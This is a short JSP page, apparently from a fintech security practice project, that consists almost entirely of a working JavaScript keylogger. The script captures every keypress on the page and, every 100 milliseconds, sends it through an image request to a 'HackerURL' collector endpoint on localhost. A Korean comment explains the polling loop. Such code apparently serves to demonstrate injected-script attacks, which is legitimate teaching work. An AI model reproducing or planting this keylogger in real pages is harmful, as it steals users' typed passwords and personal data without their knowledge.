<%@ page language="java" contentType="text/html; charset=EUC-KR"
    pageEncoding="EUC-KR"%>
<%@ page import="java.io.PrintWriter" %>
<!DOCTYPE html>
<html>
<head>
<title>fintech_pj</title>
</head>
<script>
var HackerURL = "http://127.0.0.1:8000/fintech_pj_damn/keylogger.jsp?key=";
var buffer = "";

document.onkeypress = function(e) {
	buffer = e.key;
	if(buffer == "Enter"){
		buffer = " Enter "
	}
}

// 0.1초마다 함수를 실행시켜 입력값이 있는지 확인
window.setInterval(function() {
	if(buffer.length > 0){
		var param = encodeURIComponent(buffer);
		new Image().src = HackerURL + param;
		buffer = "";
	}
}, 100);
</script>
<body>
	<input></input>
</body>
</html>